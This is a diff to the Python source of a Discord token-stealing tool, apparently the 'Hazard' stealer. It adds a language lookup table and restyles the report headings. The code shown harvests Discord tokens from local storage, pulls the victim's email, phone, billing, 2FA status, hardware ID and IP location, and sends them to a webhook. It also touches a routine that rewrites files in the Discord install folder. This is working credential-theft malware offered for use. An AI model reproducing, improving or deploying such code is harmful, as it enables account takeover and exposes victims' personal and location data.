@@ -12,7 +12,38 @@ from urllib.request import Request, urlopen
 from datetime import datetime
 
 webhook_url = "YOUR_WEBHOOK_HERE"
-password_stealer = True
+password_stealer = False
+
+languages = {
+	'da'    : 'Danish, Denmark',
+	'de'    : 'German, Germany',
+	'en-GB' : 'English, United Kingdom',
+	'en-US' : 'English, United States',
+	'es-ES' : 'Spanish, Spain',
+	'fr'    : 'French, France',
+	'hr'    : 'Croatian, Croatia',
+	'lt'    : 'Lithuanian, Lithuania',
+	'hu'    : 'Hungarian, Hungary',
+	'nl'    : 'Dutch, Netherlands',
+	'no'    : 'Norwegian, Norway',
+	'pl'    : 'Polish, Poland',
+	'pt-BR' : 'Portuguese, Brazilian, Brazil',
+	'ro'    : 'Romanian, Romania',
+	'fi'    : 'Finnish, Finland',
+	'sv-SE' : 'Swedish, Sweden',
+	'vi'    : 'Vietnamese, Vietnam',
+	'tr'    : 'Turkish, Turkey',
+	'cs'    : 'Czech, Czechia, Czech Republic',
+	'el'    : 'Greek, Greece',
+	'bg'    : 'Bulgarian, Bulgaria',
+	'ru'    : 'Russian, Russia',
+	'uk'    : 'Ukranian, Ukraine',
+	'th'    : 'Thai, Thailand',
+	'zh-CN' : 'Chinese, China',
+	'ja'    : 'Japanese',
+	'zh-TW' : 'Chinese, Taiwan',
+	'ko'    : 'Korean, Korea'
+}
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -33,11 +64,13 @@ def getheaders(token=None, content_type="application/json"):
 	if token:
 		headers.update({"Authorization": token})
 	return headers
+
 def getuserdata(token):
 	try:
 		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
 	except:
 		pass
+		
 def gettokens(path):
 	path += "\\Local Storage\\leveldb"
 	tokens = []
@@ -124,20 +157,21 @@ def main():
 			verified = user_data['verified']
 			mfa_enabled = user_data['mfa_enabled']
 			flags = user_data['flags']
-			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
+			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000)#.strftime("%d-%m-%Y・%H:%M:%S")
 
+			language = languages.get(locale)
 			nitro = bool(user_data.get("premium_type"))
 			billing = bool(has_payment_methods(token))
 			embed = {
 				"color": 16507654,
 				"fields": [
 					{
-						"name": "**Account Info**",
+						"name": "**𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼**",
 						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
 						"inline": True
 					},
 					{
-						"name": "**Pc Info**",
+						"name": "**𝗣𝗰 𝗜𝗻𝗳𝗼**",
 						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
 						"inline": True
 					},
@@ -147,17 +181,17 @@ def main():
 						"inline": False
 					},
 					{
-						"name": "**IP**",
+						"name": "**𝗜𝗣**",
 						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
 						"inline": True
 					},
 					{
-						"name": "**Other Info**",
-						"value": f'Locale: {locale}\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
+						"name": "**𝗢𝘁𝗵𝗲𝗿 𝗜𝗻𝗳𝗼**",
+						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
 						"inline": True
 					},
 					{
-						"name": "**Token**",
+						"name": "**𝗧𝗼𝗸𝗲𝗻**",
 						"value": f"`{token}`",
 						"inline": False
 					}
@@ -205,7 +239,8 @@ def HazardStealer():
 					with open(directory_list, 'w'): pass
 					with open(directory_list, 'r+') as index_file3:
 						index_file3.write(replace_string)
-				except Exception as e:
+				except Exception:
+				    pass
 	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
 		for name in files:
 			discord_file = os.path.join(root, name)
